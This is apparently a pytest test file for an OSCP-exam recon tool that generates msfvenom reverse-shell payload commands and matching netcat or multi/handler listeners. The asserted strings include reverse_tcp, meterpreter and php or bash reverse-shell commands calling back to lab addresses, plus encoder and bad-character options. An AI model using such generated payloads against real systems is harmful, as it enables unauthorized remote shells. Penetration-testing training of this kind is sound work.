from __future__ import annotations

import shlex

from typer.testing import CliRunner

from oscprecon.cli import app
from oscprecon.exploit import msfvenom

runner = CliRunner()


def test_catalog_every_payload_has_a_known_format() -> None:
    for plat in msfvenom.PLATFORMS:
        assert plat.payloads, f"{plat.key} has no payloads"
        for p in plat.payloads:
            assert p.default_format in msfvenom.FORMATS, f"{p.id} -> {p.default_format}"
            assert p.arch in ("", "x86", "x64")


def test_stageless_uses_netcat_listener() -> None:
    r = msfvenom.build_command(
        msfvenom.MsfvenomSpec(payload="win-x64-stageless", lhost="10.10.14.7", lport=443)
    )
    assert r.command == (
        "msfvenom -p windows/x64/shell_reverse_tcp -a x64 "
        "LHOST=10.10.14.7 LPORT=443 -f exe -o shell.exe"
    )
    assert r.listener == "nc -lvnp 443"
    assert not r.meterpreter
    assert r.notes == ()  # exam-safe default has no warnings


def test_meterpreter_uses_handler_and_warns() -> None:
    r = msfvenom.build_command(
        msfvenom.MsfvenomSpec(payload="win-x86-met", lhost="10.0.0.1", lport=4444)
    )
    assert r.meterpreter is True
    assert "multi/handler" in r.listener
    assert "windows/meterpreter/reverse_tcp" in r.listener
    assert any(
        "one Metasploit use" in n.lower() or "one metasploit use" in n.lower() for n in r.notes
    )


def test_staged_nonmeterpreter_uses_handler_and_warns() -> None:
    r = msfvenom.build_command(
        msfvenom.MsfvenomSpec(payload="win-x86-staged", lhost="10.0.0.1", lport=4444)
    )
    assert not r.meterpreter
    assert r.staged is True
    assert "multi/handler" in r.listener
    assert any("staged" in n.lower() for n in r.notes)


def test_encoder_and_badchars_flags() -> None:
    r = msfvenom.build_command(
        msfvenom.MsfvenomSpec(
            payload="lin-x64-stageless",
            lhost="10.0.0.1",
            lport=9001,
            encoder="x64/xor_dynamic",
            iterations=3,
            badchars=r"\x00\x0a",
        )
    )
    argv = shlex.split(r.command)
    assert "-e" in argv and "x64/xor_dynamic" in argv
    assert argv[argv.index("-i") + 1] == "3"
    # bad chars are single-quoted in the command so the \x escapes survive the shell; shlex.split
    # (which honors the quotes) recovers the literal value.
    assert "-b" in argv and argv[argv.index("-b") + 1] == r"\x00\x0a"
    assert r"'\x00\x0a'" in r.command  # quoted in the rendered command


def test_raw_payload_string_passthrough_detects_meterpreter() -> None:
    r = msfvenom.build_command(
        msfvenom.MsfvenomSpec(
            payload="windows/x64/meterpreter/reverse_https", fmt="exe", lhost="10.0.0.1", lport=8443
        )
    )
    assert r.command.startswith("msfvenom -p windows/x64/meterpreter/reverse_https ")
    assert r.meterpreter is True  # detected from the raw string
    assert "multi/handler" in r.listener


def test_raw_staged_nonmeterpreter_gets_handler_not_netcat() -> None:
    # a manually-typed STAGED shell (stage as a path segment) needs multi/handler, not netcat
    r = msfvenom.build_command(
        msfvenom.MsfvenomSpec(
            payload="windows/shell/reverse_tcp", fmt="exe", lhost="10.0.0.1", lport=4444
        )
    )
    assert r.staged is True
    assert "multi/handler" in r.listener
    assert "nc -lvnp" not in r.listener


def test_raw_single_stage_payloads_stay_on_netcat() -> None:
    # single-stage payloads (underscore-fused, or cmd/php reverse) are netcat-catchable — the
    # staging heuristic must NOT false-positive on their `reverse_` token.
    for raw in ("windows/shell_reverse_tcp", "php/reverse_php", "cmd/unix/reverse_bash"):
        r = msfvenom.build_command(msfvenom.MsfvenomSpec(payload=raw, lhost="10.0.0.1", lport=4444))
        assert r.staged is False, raw
        assert r.listener == "nc -lvnp 4444", raw


def test_missing_lhost_placeholder_and_note() -> None:
    r = msfvenom.build_command(msfvenom.MsfvenomSpec(payload="lin-x86-stageless", lport=4444))
    assert "LHOST=<LHOST>" in r.command
    assert any("lhost" in n.lower() for n in r.notes)


def test_raw_format_omits_outfile_unless_set() -> None:
    r = msfvenom.build_command(
        msfvenom.MsfvenomSpec(payload="php-stageless", lhost="10.0.0.1", lport=80)
    )
    assert " -o " not in r.command  # raw prints to stdout; no auto -o
    r2 = msfvenom.build_command(
        msfvenom.MsfvenomSpec(payload="php-stageless", lhost="10.0.0.1", lport=80, outfile="s.php")
    )
    assert r2.command.endswith("-o s.php")


def test_command_is_a_single_popen_safe_argv() -> None:
    # the generated msfvenom command must itself be a single program invocation (no shell ops)
    for plat in msfvenom.PLATFORMS:
        for p in plat.payloads:
            r = msfvenom.build_command(
                msfvenom.MsfvenomSpec(payload=p.id, lhost="10.0.0.1", lport=4444)
            )
            argv = shlex.split(r.command)
            assert argv[0] == "msfvenom"
            assert not [t for t in argv if t in {"|", "&&", "||", ";", ">", "<", "&"}], p.id


def test_cli_lists_payloads() -> None:
    result = runner.invoke(app, ["payload"])
    assert result.exit_code == 0
    assert "win-x64-stageless" in result.stdout
    assert "meterpreter=one-use" in result.stdout


def test_cli_builds_command_and_listener() -> None:
    result = runner.invoke(app, ["payload", "win-x64-stageless", "-l", "10.10.14.7", "-P", "443"])
    assert result.exit_code == 0
    assert "msfvenom -p windows/x64/shell_reverse_tcp" in result.stdout
    assert "nc -lvnp 443" in result.stdout


def test_cli_meterpreter_prints_warning() -> None:
    result = runner.invoke(app, ["payload", "lin-x64-met", "-l", "10.10.14.7"])
    assert result.exit_code == 0
    assert "multi/handler" in result.stdout
    assert "Metasploit use" in result.stdout
